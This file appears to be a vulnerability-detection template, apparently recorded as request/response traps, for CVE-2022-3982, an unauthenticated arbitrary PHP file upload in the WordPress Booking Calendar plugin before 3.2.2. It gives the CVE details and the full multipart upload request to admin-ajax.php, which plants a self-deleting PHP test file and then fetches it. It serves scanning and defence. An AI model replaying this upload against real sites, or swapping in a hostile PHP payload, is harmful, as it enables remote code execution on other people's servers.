id: CVE-2022-3982
info:
  name: WordPress Booking Calendar <3.2.2 - Arbitrary File Upload
  author: theamanrawat
  description: 'WordPress Booking Calendar plugin before 3.2.2 is susceptible to arbitrary
    file upload possibly leading to remote code execution. The plugin does not validate
    uploaded files, which can allow an attacker to upload arbitrary files, such as
    PHP, and potentially obtain sensitive information, modify data, and/or execute
    unauthorized operations.

    '
  severity: critical
  impact: 'This vulnerability can lead to remote code execution, allowing attackers
    to take control of the affected WordPress website.

    '
  remediation: Fixed in 3.2.2.
  reference:
  - https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867
  - https://wordpress.org/plugins/booking-calendar/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3982
  - https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-3982
    cwe-id: CWE-434
    epss-score: 0.20211
    epss-percentile: 0.96236
    cpe: cpe:2.3:a:wpdevart:booking_calendar:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: wpdevart
    product: booking_calendar
    framework: wordpress
  tags: cve,cve2022,rce,wpscan,wordpress,wp-plugin,wp,booking-calendar,unauthenticated,intrusive,wpdevart
traps:
- request:
    method: GET
    path: /
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /wp-admin/admin-ajax.php
    headers:
      Content-Type: multipart/form-data; boundary=------------------------1cada150a8151a54
    body: |
      --------------------------1cada150a8151a54
      Content-Disposition: form-data; name="action"

      wpdevart_form_ajax
      --------------------------1cada150a8151a54
      Content-Disposition: form-data; name="wpdevart_id"

      x
      --------------------------1cada150a8151a54
      Content-Disposition: form-data; name="wpdevart_nonce"

      {{nonce}}
      --------------------------1cada150a8151a54
      Content-Disposition: form-data; name="wpdevart_data"

      {"wpdevart-submit":"X"}
      --------------------------1cada150a8151a54
      Content-Disposition: form-data; name="wpdevart-submit"

      1
      --------------------------1cada150a8151a54
      Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
      Content-Type: application/octet-stream

      <?php echo md5("{{string}}");unlink(__FILE__);?>

      --------------------------1cada150a8151a54--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-content/uploads/booking_calendar/.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: e1bb1e04b786e90b07ebc4f7a2bff37d
